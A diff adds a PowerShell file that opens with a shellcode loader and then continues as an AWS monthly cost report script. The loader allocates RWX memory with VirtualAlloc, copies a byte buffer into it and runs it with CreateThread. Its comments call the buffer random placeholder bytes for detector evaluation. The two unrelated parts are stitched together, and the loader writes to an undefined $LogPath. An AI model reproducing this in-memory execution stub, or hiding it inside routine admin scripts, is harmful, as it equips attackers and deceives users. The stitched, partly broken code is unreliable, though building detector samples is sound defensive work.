@@ -1,0 +1,139 @@
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+try {
+    $NativeCode = @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public static class NativeMethods
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+            uint dwFreeType);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+    "@
+
+    Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
+    $Buffer = [Byte[]] @(
+        0xd7, 0xbc, 0x7f, 0xf7, 0x0b, 0x83, 0x32, 0x1b, 0x64, 0x5f, 0xba, 0xf4, 0x6f, 0x0c, 0x1c, 0x50,
+        0x17, 0x76, 0x2d, 0x48, 0x9f, 0xdb, 0x30, 0xc3, 0x4a, 0x41, 0x8f, 0x65, 0xfe, 0x75, 0x39, 0xf7,
+        0x16, 0xa5, 0xe9, 0x22, 0x97, 0xec, 0x31, 0x76, 0x22, 0xd4, 0x9f, 0x06, 0xc9, 0xcd, 0x97, 0xf0,
+        0xa8, 0x5d, 0x4f, 0x30, 0x26, 0x11, 0xfc, 0x06, 0xaa, 0x42, 0x68, 0x1a, 0x82, 0x42, 0x74, 0x89,
+        0x36, 0xbf, 0x37, 0xd6, 0xc5, 0xa1, 0x3f, 0x7e, 0x41, 0x5c, 0xf6, 0x1b, 0x95, 0x5e, 0x13, 0xcb,
+        0x75, 0xa5, 0x73, 0x06, 0x7c, 0x15, 0x9d, 0x0a, 0xf6, 0xd1, 0x6f, 0xe9, 0xd1, 0x85, 0x0c, 0x31,
+        0x70, 0x96, 0x50, 0xa0, 0xaf, 0xc1, 0x31, 0x11, 0x05, 0x5c, 0x2f, 0x8f, 0xaf, 0xba, 0x25, 0x0b,
+        0x3b, 0xb1, 0x3b, 0xa3, 0xc3, 0xc4, 0xfd, 0x42, 0xa8, 0xe1, 0x37, 0x22, 0x96, 0x38, 0x52, 0x57,
+        0xe9, 0x32, 0xf8, 0x86, 0xc0, 0xea, 0xe8, 0x5c, 0x54, 0xee, 0x36, 0x9f, 0x84, 0x47, 0xe3, 0x4d,
+        0xfe, 0x41, 0x05, 0x54, 0xdc, 0xaf, 0x81, 0x4c, 0x86, 0x2d, 0x3c, 0x3d, 0xcb, 0x20, 0x45, 0xe1,
+        0x12, 0x01, 0x14, 0x8a, 0xc0, 0x1f, 0xf2, 0x26, 0x0e, 0x0f, 0xb9, 0x0d, 0x78, 0x17, 0x5f, 0x27,
+        0x64, 0x2f, 0x86, 0xf1, 0xfd, 0x79, 0xb2, 0xad, 0xea, 0x4c, 0x3e, 0xcb, 0xf4, 0x84, 0x37, 0x3f,
+        0x70, 0xf5, 0xba, 0x9e, 0x28, 0x3e, 0x04, 0xff, 0x0b, 0x5e, 0x57, 0x60, 0x82, 0x64, 0xda, 0x32,
+        0xce, 0x9a, 0x5a, 0x51, 0x6b, 0x86, 0xd0, 0x28, 0x9d, 0x60, 0x4c, 0xd3, 0x51, 0xdc, 0x2e, 0xd5,
+        0xe9, 0xbd, 0xe3, 0xed, 0xf8, 0xc7, 0xd8, 0x5b, 0x6e, 0xb6, 0xf3, 0xe3, 0x41, 0x1b, 0x9f, 0xc4,
+        0x08, 0x0c, 0x46, 0x05, 0x6d, 0x98, 0x8e, 0x4a, 0x6b, 0xba, 0xf2, 0x97, 0x06, 0xac, 0xdc, 0x88,
+        0xf2, 0x35, 0x1f, 0xb2, 0x83, 0x3e, 0xdf, 0xa0, 0x41, 0x69, 0x11, 0x0d, 0xa5, 0x33, 0x36, 0xed,
+        0x1b, 0xc2, 0x81, 0x08, 0x0a, 0x5c, 0xca, 0x01
+    )
+
+    $Handle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+    if ($Handle -eq [IntPtr]::Zero) {
+        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        return
+    }
+
+    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
+    $ThreadId = 0
+    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+    [void][NativeMethods]::WaitForSingleObject($Thread, 2633)
+    [void][NativeMethods]::CloseHandle($Thread)
+
+    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+}
+catch {
+    Write-Warning "loader failed: $($_.Exception.Message)"
+}
+<#
+.SYNOPSIS
+    Builds a monthly cloud cost report per service and flags overspend.
+.PARAMETER Threshold
+    Paths are resolved relative to the invoking session.
+.EXAMPLE
+    .\Get-CloudCostReport.ps1 -Threshold 5000
+#>
+
+$ErrorActionPreference = 'Stop'
+
+$Threshold = 5000
+$Region = "us-east-1"
+$ProfileName = 'contoso-prod'
+$Month = '2026-10'
+$Account = "810326948182"
+$ReportPath = 'D:\Ops\finops\cost-aws-2026-10.csv'
+$OutputPath = 'D:\Ops\finops\cost-aws-2026-10.json'
+
+$hostName = $env:COMPUTERNAME
+$InformationPreference = 'SilentlyContinue'
+
+$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
+$end = (Get-Date).ToString('yyyy-MM-01')
+$raw = aws ce get-cost-and-usage --time-period Start=$start,End=$end --granularity MONTHLY --metrics UnblendedCost --profile $ProfileName --region $Region --output json
+if ($LASTEXITCODE -ne 0) {
+    throw 'AWS Cost Explorer query failed.'
+}
+$cost = $raw | ConvertFrom-Json
+$groups = foreach ($bucket in $cost.ResultsByTime) {
+    foreach ($group in $bucket.Groups) {
+        [pscustomobject]@{
+            Period  = $bucket.TimePeriod.Start
+            Service = $group.Keys[0]
+            Amount  = [math]::Round([double]$group.Metrics.UnblendedCost.Amount, 2)
+            Unit    = $group.Metrics.UnblendedCost.Unit
+        }
+    }
+}
+
+$byService = $groups | Group-Object -Property Service | ForEach-Object {
+    [pscustomobject]@{
+        Service = $_.Name
+        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
+    }
+} | Sort-Object -Property Amount -Descending
+$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
+Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan
+
+$byService | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
+
+$topServices = $byService | Select-Object -First 5
+$topServices | Format-Table -AutoSize
+if ($total -gt $Threshold) {
+    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
+}
